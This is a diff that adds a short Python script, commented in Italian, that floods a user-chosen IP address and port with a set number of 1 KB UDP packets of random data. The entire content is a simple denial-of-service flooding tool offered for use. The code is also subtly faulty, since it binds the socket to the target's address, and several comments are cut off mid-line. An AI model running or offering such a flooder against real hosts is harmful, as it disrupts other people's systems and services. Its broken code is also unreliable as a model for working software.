@@ -1,0 +1,24 @@
+                     
+import socket,random
+#importo i moduli socket e random
+
+Ip_target = input ("inserisci IP target:\n")
+Porta = int(input ("Inserisci la porta:\n"))
+pacchetti  =int (input ("Inserire il numero di pacchetti da inviar>
+#sopra definisco gli input e sotto un variabile per il controllo >
+
+i = 0
+while 1:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                  #definiamo un nuovo socket in cui specifichiamo che voglia>
+        s.bind((Ip_target, Porta))
+                  #bind per associare il socket all'ip e la porta
+        data = random.randbytes(1024)
+                  #con modulo random definiamo data con un Kb 
+        addr= (str(Ip_target), int(Porta))
+        while i<pacchetti:
+                  #qui andiamo a fare un controllo in modo tale che una vol>
+                s.sendto(data,addr)
+                i=i+1
+        s.close()
+        quit()
